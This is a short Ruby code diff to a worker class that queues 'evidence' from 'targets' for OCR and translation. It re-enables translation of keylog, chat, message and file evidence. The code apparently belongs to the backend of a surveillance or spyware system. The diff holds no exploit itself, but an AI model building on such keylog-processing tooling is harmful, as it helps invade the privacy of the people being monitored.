@@ -183,7 +183,7 @@ class InstanceWorker
                   OCRQueue.add(@target._id, evidence._id) if evidence and evidence.type == 'screenshot'
 
                   # add to the translation quueue
-                  #TransQueue.add(@target._id, evidence._id) if evidence and ['keylog', 'chat', 'mail', 'file'].include? evidence.type
+                  TransQueue.add(@target._id, evidence._id) if evidence and ['keylog', 'chat', 'message', 'file'].include? evidence.type
                 end
 
               rescue InvalidAgentTarget => e
